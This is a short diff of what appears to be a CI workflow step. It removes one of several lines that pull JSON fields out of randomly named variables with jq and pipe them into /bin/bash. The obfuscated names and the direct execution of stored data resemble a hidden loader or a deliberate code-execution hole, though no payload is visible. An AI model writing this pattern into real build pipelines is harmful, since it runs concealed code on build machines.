@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$larg61288" | jq -r .zth655 | /bin/bash
           echo $e237 | jq -r .chhkh0 | /bin/bash
-          echo $ukgc73061 | jq -r .jvctw1 | /bin/bash
           echo $mhlg47832 | jq -r .fx00 | /bin/bash
           echo $pms19132 | jq -r .nodyu3286 | /bin/bash
           echo $r848 | jq -r .i69571 | /bin/bash
